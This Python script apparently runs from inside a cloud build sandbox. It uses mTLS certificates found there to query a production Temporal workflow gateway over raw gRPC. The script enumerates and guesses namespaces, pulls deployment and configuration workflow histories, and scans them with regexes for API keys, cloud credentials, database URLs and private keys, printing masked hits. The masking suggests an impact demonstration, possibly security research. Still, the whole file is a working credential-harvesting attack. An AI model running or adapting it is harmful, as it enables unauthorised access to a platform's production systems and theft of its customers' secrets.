#!/usr/bin/env python3
# i79598 Temporal history payload scanner (read-only) - runs inside build sandbox with /pki mTLS certs
import subprocess, struct, os, re, json, sys, base64, hashlib, time

HOST = 'external-mtls-service-gateway-us-west1.gcp.production.rlwy.net:443'
W = '/temporal.api.workflowservice.v1.WorkflowService/'
CERT = '/pki/client.crt'; KEY = '/pki/client.key'; CA = '/pki/server-ca-bundle.crt'
MAXH = int(os.environ.get('MAXH', '45'))
MAXBYTES = int(os.environ.get('MAXBYTES', '40000000'))

def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        out.append(b | 0x80 if n else b)
        if not n: return bytes(out)

def fv(f, n): return varint(f << 3) + varint(n)
def fb(f, b): return varint((f << 3) | 2) + varint(len(b)) + b
def fs(f, s): return fb(f, s.encode() if isinstance(s, str) else s)

def rd(b, i):
    r = 0; s = 0
    while i < len(b):
        x = b[i]; r |= (x & 0x7f) << s; i += 1
        if not x & 0x80: return r, i
        s += 7
        if s > 63: break
    raise ValueError('varint')

def parse(b):
    i = 0; out = []
    while i < len(b):
        k, i = rd(b, i); f = k >> 3; w = k & 7
        if f == 0: raise ValueError('f0')
        if w == 0:
            v, i = rd(b, i); out.append((f, 0, v))
        elif w == 2:
            l, i = rd(b, i)
            if i + l > len(b): raise ValueError('len')
            out.append((f, 2, b[i:i+l])); i += l
        elif w == 5: out.append((f, 5, b[i:i+4])); i += 4
        elif w == 1: out.append((f, 1, b[i:i+8])); i += 8
        else: raise ValueError('wt')
    return out

def one(b, f):
    try:
        for ff, w, v in parse(b):
            if ff == f and w == 2: return v
    except Exception: pass
    return None

def grpc(path, body=b'', timeout=40):
    framed = b'\x00' + struct.pack('>I', len(body)) + body
    open('/tmp/f.bin', 'wb').write(framed)
    cmd = ['curl', '-sS', '--http2', '--connect-timeout', '8', '-m', str(timeout),
           '--cert', CERT, '--key', KEY, '--cacert', CA,
           '-D', '/tmp/h.txt', '-o', '/tmp/b.bin', '--trace-ascii', '/tmp/t.txt', '-w', '%{http_code}',
           '-X', 'POST', 'https://%s%s' % (HOST, path),
           '-H', 'content-type: application/grpc', '-H', 'te: trailers',
           '--data-binary', '@/tmp/f.bin']
    p = subprocess.run(cmd, capture_output=True, text=True)
    hdr = ''
    for fn in ('/tmp/h.txt', '/tmp/t.txt'):
        try: hdr += open(fn, 'rb').read().decode('utf-8', 'replace')
        except Exception: pass
    st = re.findall(r'grpc-status:\s*(\d+)', hdr)
    ms = re.findall(r'grpc-message:\s*(.*)', hdr)
    data = b''
    try:
        data = open('/tmp/b.bin', 'rb').read()
    except Exception: pass
    if len(data) >= 5 and data[0] == 0:
        l = struct.unpack('>I', data[1:5])[0]; data = data[5:5+l]
    return {'http': p.stdout.strip(), 'st': st[-1] if st else '-', 'msg': (ms[-1].strip() if ms else ''), 'data': data}

SENSKEY = re.compile(r'(?i)(openai|anthropic|claude|gemini|google|vertex|aws_|azure|supabase|database_url|redis_url|postgres|mysql|mongo|dsn|_key\b|api_?key|token|secret|password|passwd|credential|private_key|mnemonic|seed)')
VALPAT = re.compile(r'(?:sk-[A-Za-z0-9_\-]{16,}|sk-ant-[A-Za-z0-9_\-]{16,}|AIza[0-9A-Za-z_\-]{30,}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}|eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.|postgres(?:ql)?://[^\s"]+|mysql://[^\s"]+|mongodb(?:\+srv)?://[^\s"]+|redis://[^\s"]+|-----BEGIN [A-Z ]*PRIVATE KEY-----)')

DEC = json.JSONDecoder()

def json_blobs(b):
    s = b.decode('utf-8', 'ignore'); out = []; i = 0; n = len(s)
    while i < n:
        if s[i] in '{[':
            try:
                obj, end = DEC.raw_decode(s[i:])
                out.append(obj); i += max(end, 1); continue
            except Exception: pass
        i += 1
    return out

def walk(o, path=''):
    if isinstance(o, dict):
        for k, v in o.items():
            yield from walk(v, path + '.' + str(k))
    elif isinstance(o, list):
        for i, v in enumerate(o):
            yield from walk(v, path + '[%d]' % i)
    else:
        yield path, o

def try_b64_json(s):
    if not isinstance(s, str) or len(s) < 40: return None
    if not re.fullmatch(r'[A-Za-z0-9+/=_\-\s]{40,}', s): return None
    try:
        raw = base64.b64decode(s.replace(' ', '').replace('\n', '') + '=' * (-len(s) % 4), validate=False)
        t = raw.decode('utf-8')
        if t.strip()[:1] in ('{', '['):
            return json.loads(t)
    except Exception: pass
    return None

hits = []
enc_counts = {'encrypted_marker': 0, 'nonjson_payloads': 0}
seen_vals = set()

def scan_json(ns, wtype, evtype, obj):
    cnt = 0
    for path, val in walk(obj):
        if isinstance(val, dict) or isinstance(val, list): continue
        key = path.split('.')[-1].lower()
        sval = None
        if isinstance(val, str):
            # b64-wrapped json?
            sub = try_b64_json(val)
            if sub is not None:
                cnt += scan_json(ns, wtype, evtype, sub)
                continue
            sval = val
        hit = None
        if sval is not None and VALPAT.search(sval):
            hit = 'VAL'
        elif sval is not None and SENSKEY.search(key) and len(sval) >= 6 and not sval.startswith('${{'):
            hit = 'KEYNAME'
        if hit:
            tag = hashlib.sha256(sval.encode()).hexdigest()[:8] if sval else ''
            ln = len(sval) if sval else 0
            dedup = (ns, wtype, evtype, key, tag)
            if dedup in seen_vals: continue
            seen_vals.add(dedup)
            disp = ''
            if hit == 'VAL':
                m = VALPAT.search(sval); disp = m.group(0)[:6] + '...'
            hits.append({'ns': ns, 'wt': wtype, 'ev': evtype, 'path': path[:160], 'key': key,
                         'len': ln, 'tag': tag, 'kind': hit, 'disp': disp})
            cnt += 1
    return cnt

def summarize(obj, maxlen=400):
    try: s = json.dumps(obj, ensure_ascii=False)
    except Exception: s = str(obj)
    # mask long alnum strings
    s = re.sub(r'[A-Za-z0-9_\-]{24,}', lambda m: m.group(0)[:4] + '~' + str(len(m.group(0))), s)
    return s[:maxlen]

def find_namespaces():
    r = grpc(W + 'ListNamespaces', fv(1, 50), 30)
    print('NSLIST|%s|%s|%d|%s' % (r['http'], r['st'], len(r['data']), r['msg'][:60]), flush=True)
    names = []
    if r['data']:
        for f, w, v in parse(r['data']):
            if f == 1 and w == 2:
                ni = one(v, 1)
                if ni:
                    nm = one(ni, 1)
                    if nm:
                        names.append(nm.decode('utf-8', 'replace'))
    print('NSLIST_NAMES|' + ','.join(names), flush=True)
    return names

def list_execs(ns, query='', page=40):
    body = fs(1, ns) + fv(2, page)
    if query: body += fs(4, query)
    r = grpc(W + 'ListWorkflowExecutions', body, 60)
    print('LWE|%s|%s|%s|%d|%s' % (ns, 'q' if query else '-', r['st'], len(r['data']), r['msg'][:50]), flush=True)
    out = []
    if not r['data']: return out
    try:
        for f, w, v in parse(r['data']):
            if f != 1 or w != 2: continue
            ex = one(v, 1); ty = one(v, 2)
            wid = one(ex, 1) if ex else None; rid = one(ex, 2) if ex else None
            tname = one(ty, 1) if ty else None
            out.append({'wid': (wid or b'').decode('utf-8', 'replace'), 'rid': (rid or b'').decode('utf-8', 'replace'),
                        'type': (tname or b'').decode('utf-8', 'replace'), 'raw': v})
    except Exception as e:
        print('LWE_PARSE_ERR|%s|%r' % (ns, e), flush=True)
    return out

def get_history(ns, ex):
    body = fs(1, ns) + fb(2, fs(1, ex['wid']) + fs(2, ex['rid'])) + fv(3, 500)
    r = grpc(W + 'GetWorkflowExecutionHistory', body, 90)
    return r

def scan_history(ns, ex, r):
    if not r['data']:
        print('HIST|%s|%s|%s|st=%s|nodata' % (ns, ex['type'], ex['wid'][:12], r['st']), flush=True)
        return 0
    hist = one(r['data'], 1) or b''
    events = []
    try:
        for f, w, v in parse(hist):
            if f == 1 and w == 2: events.append(v)
    except Exception as e:
        print('HIST_PARSE_ERR|%r' % e, flush=True)
        return 0
    njson = 0; nenc = 0; nhit = 0; samples = []
    for ev in events:
        et = 0
        try:
            for f, w, v in parse(ev):
                if f == 3 and w == 0: et = v; break
        except Exception: pass
        if b'binary/encrypted' in ev or b'codec' in ev.lower() or b'encoding' in ev and b'encrypted' in ev:
            nenc += 1
        blobs = json_blobs(ev)
        for obj in blobs:
            njson += 1
            nh = scan_json(ns, ex['type'], str(et), obj)
            nhit += nh
            if nh and len(samples) < 3 and isinstance(obj, dict):
                samples.append((et, obj))
    enc_counts['encrypted_marker'] += nenc
    print('HIST|%s|%s|%s|st=%s|ev=%d|json=%d|enc=%d|hits=%d' % (ns, ex['type'], ex['wid'][:12], r['st'], len(events), njson, nenc, nhit), flush=True)
    for et, obj in samples[:2]:
        print('SAMPLE|%s|%s|%s|%s' % (ns, ex['type'], et, summarize(obj)), flush=True)
    return nhit

def main():
    t0 = time.time()
    r = grpc(W + 'GetSystemInfo', b'', 20)
    print('SYS|%s|%s|%d|%s' % (r['http'], r['st'], len(r['data']), r['msg'][:60]), flush=True)
    names = find_namespaces()
    cands = ['builds', 'default', 'temporal', 'temporal-system', 'backboard', 'backboard-production',
             'backboard-staging', 'storage_production_oyq1d', 'storage-production', 'deployments',
             'snapshots', 'orchestrator', 'vm-runtime', 'mono', 'production', 'railway', 'system']
    for c in cands:
        if c in names: continue
        d = grpc(W + 'DescribeNamespace', fs(1, c), 20)
        if d['st'] == '0':
            names.append(c)
        print('DESC|%s|%s|%s|%d' % (c, d['st'], d['msg'][:40], len(d['data'])), flush=True)
    if 'builds' not in names:
        names.append('builds')
    if not names:
        names = ['builds']
    print('NS_FINAL|' + ','.join(names), flush=True)
    total_hist = 0; total_hits = len(hits); got = 0
    budget_bytes = 0
    for ns in names:
        exs = list_execs(ns, '', 50)
        if not exs and ns != 'builds':
            continue
        # matrix of types
        typ = {}
        for e in exs: typ[e['type']] = typ.get(e['type'], 0) + 1
        print('WFTYPE|%s|%s' % (ns, json.dumps(typ, ensure_ascii=False)[:800]), flush=True)
        # priority ordering, then recency
        def prio(e):
            t = e['type'].lower(); s = 0
            for i, k in enumerate(['apply', 'deploy', 'environment', 'patch', 'snapshot', 'provision', 'config', 'schedule']):
                if k in t: s += 100 - i * 10
            return -s
        ordered = sorted(exs, key=prio)
        for e in ordered:
            if got >= MAXH or budget_bytes > MAXBYTES or time.time() - t0 > 900:
                break
            r = get_history(ns, e)
            budget_bytes += len(r['data'])
            got += 1; total_hist += 1
            total_hits += scan_history(ns, e, r)
    print('MATRIX_TOTAL|hist=%d|hits=%d|bytes=%d|enc=%s|elapsed=%d' % (total_hist, total_hits, budget_bytes, json.dumps(enc_counts), int(time.time()-t0)), flush=True)
    for h in hits[:80]:
        print('HIT|%s|%s|%s|%s|%s|%d|%s|%s|%s' % (h['ns'], h['wt'][:40], h['ev'], h['key'][:40], h['path'][:80], h['len'], h['tag'], h['kind'], h['disp']), flush=True)
    print('HITS_TOTAL|%d|uniq=%d' % (len(hits), len(seen_vals)), flush=True)
    print('DONE-i79598', flush=True)

if __name__ == '__main__':
    try: main()
    except Exception as e:
        import traceback; traceback.print_exc()
